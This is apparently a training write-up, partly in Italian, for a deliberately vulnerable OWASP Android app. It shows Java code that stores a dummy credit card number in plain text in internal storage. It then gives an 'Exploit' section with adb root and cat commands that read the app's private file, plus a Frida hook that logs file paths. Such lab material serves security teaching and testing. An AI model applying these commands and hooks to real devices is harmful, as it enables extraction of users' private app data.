## OMTG-DATAST-001-INTERNALSTORAGE 

> app/src/main/sg/vp/owasp_mobile/OMTG_Android/OMTG_DATAST_001_InternalStorage.java

```java
FileOutputStream fileOutputStream;

try {

	fileOutputStream = openFileOutput("test_file", 0);

} catch (FileNotFoundException e) {

	e.printStackTrace();
	fileOutputStream = null;
	
}

fileOutputStream.write("Credit Card Number is 1234 4321 5678 8765".getBytes());

fileOutputStream.close();
```

Exploit:

- `$ adb root`

- `$ adb shell cat /data/data/sg.vp.owasp_mobile.omtg_android/files/test_file`

```
Credit Card Number is 1234 4321 5678 8765
```

oppure

- inietta il seguente script tramite frida per avere il path del file creato

```javascript
Java.perform(function () {

	var fileOutputStream = Java.use("java.io.FileOutputStream");

    fileOutputStream.$init
    	.overload('java.io.File', 'boolean')
    	.implementation = function (name, append) {

    		console.log(name)

    		return this.$init(name, append)
    		
    	}

});
```

- visualizza il contenuto del file con `adb`